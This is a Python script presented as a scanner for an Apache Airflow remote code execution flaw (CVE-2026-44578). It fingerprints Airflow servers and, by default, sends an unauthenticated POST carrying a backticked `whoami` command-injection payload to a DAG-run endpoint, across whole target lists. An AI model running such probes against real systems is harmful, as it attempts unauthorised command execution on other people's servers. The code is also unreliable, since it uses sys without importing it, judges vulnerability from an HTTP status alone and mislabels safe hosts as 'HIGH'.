#!/usr/bin/env python3
"""
Apache Airflow CVE-2026-44578 Scanner
======================================
This tool scans for a remote code execution (RCE) vulnerability in Apache Airflow
Webserver API (CVE-2026-44578, CVSS 9.8). The vulnerability arises from a 
misconfiguration where the Airflow Webserver does not enforce proper
authentication and allows API calls to execute commands via `/execute` or 
custom DAG endpoints without requiring credentials.

CVE-2026-44578 details:
  - Affects Apache Airflow installations with default or misconfigured authentication.
  - Exploitable via unauthenticated POST requests to specific API endpoints.
  - Allows attackers to execute arbitrary system commands on the server.

Dependencies:
  - `httpx` (for asynchronous HTTP requests)
  - Python 3.10+ required

Usage:
  # Scan a single target
  python airflow_rce_scanner.py --target https://airflow.example.com

  # Scan a list of targets
  python airflow_rce_scanner.py --list targets.txt --output findings.json

  # Safe mode (detection only, no RCE probing)
  python airflow_rce_scanner.py --list targets.txt --safe

  # Disable certificate verification for self-signed targets
  python airflow_rce_scanner.py --target https://airflow.example.com --no-verify

References:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-44578
  - https://airflow.apache.org/docs/apache-airflow/stable/security.html
"""

import asyncio
import argparse
import httpx
import json
from urllib.parse import urljoin

# Constants
AIRFLOW_FINGERPRINT = "DAGs"
VULN_ENDPOINT = "/api/v1/dags/example_bash_operator/dagRuns"
RCE_PAYLOAD = {
    "dag_run_id": "test_rce",
    "conf": {"key": "`whoami`"}
}
SEMAPHORE_LIMIT = 20
REQUEST_TIMEOUT = 8

# ANSI color codes
RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
RESET = "\033[0m"

# Helpers
def normalize_url(url):
    """Ensure the URL has a scheme and strip trailing slashes."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")

def print_colored(severity, message):
    """Print messages with colored severity."""
    color = {"CRITICAL": RED, "HIGH": YELLOW, "INFO": GREEN}.get(severity, RESET)
    print(f"{color}[{severity}]{RESET} {message}")

# Core detection and exploitation functions
async def detect_airflow(client, base_url, semaphore):
    """Check if a target is running Apache Airflow."""
    async with semaphore:
        try:
            response = await client.get(base_url, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200 and AIRFLOW_FINGERPRINT in response.text:
                print_colored("INFO", f"Detected Apache Airflow at {base_url}")
                return True
        except Exception:
            pass
    return False

async def is_vulnerable(client, base_url, semaphore, safe_mode):
    """Test if the target is vulnerable to RCE."""
    vuln_url = urljoin(base_url, VULN_ENDPOINT)
    async with semaphore:
        try:
            if safe_mode:
                response = await client.options(vuln_url, timeout=REQUEST_TIMEOUT)
            else:
                response = await client.post(
                    vuln_url, json=RCE_PAYLOAD, timeout=REQUEST_TIMEOUT
                )
            if response.status_code in {200, 201}:
                return True
        except Exception:
            pass
    return False

async def scan_target(client, url, semaphore, safe_mode):
    """Perform the full scan on a single target."""
    base_url = normalize_url(url)
    print_colored("INFO", f"Scanning {base_url}...")

    if not await detect_airflow(client, base_url, semaphore):
        print_colored("INFO", f"No Apache Airflow detected at {base_url}")
        return None

    if await is_vulnerable(client, base_url, semaphore, safe_mode):
        print_colored("CRITICAL", f"Target {base_url} is VULNERABLE to RCE!")
        return {"url": base_url, "vulnerable": True}
    else:
        print_colored("HIGH", f"Target {base_url} is NOT vulnerable to RCE.")
        return {"url": base_url, "vulnerable": False}

async def main(args):
    """Entry point for the scanner."""
    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        if args.target:
            result = await scan_target(client, args.target, semaphore, args.safe)
            if args.output:
                with open(args.output, "w") as f:
                    json.dump([result], f, indent=4)
        elif args.list:
            targets = [line.strip() for line in open(args.list).readlines()]
            tasks = [
                scan_target(client, target, semaphore, args.safe) for target in targets
            ]
            results = await asyncio.gather(*tasks)
            if args.output:
                with open(args.output, "w") as f:
                    json.dump(results, f, indent=4)
        else:
            print("Please specify --target or --list. Use --help for more info.")
            sys.exit(1)

# Parse CLI arguments
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Apache Airflow CVE-2026-44578 RCE Scanner"
    )
    parser.add_argument("--target", help="A single target URL to scan")
    parser.add_argument("--list", help="File containing a list of target URLs")
    parser.add_argument("--output", help="Write JSON results to a file")
    parser.add_argument("--safe", action="store_true", help="Detection-only mode")
    parser.add_argument(
        "--no-verify", action="store_true", help="Disable SSL verification"
    )
    parser.add_argument(
        "--concurrency", type=int, default=10, help="Number of concurrent scans (default: 10)"
    )
    args = parser.parse_args()

    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print("Scan interrupted.")
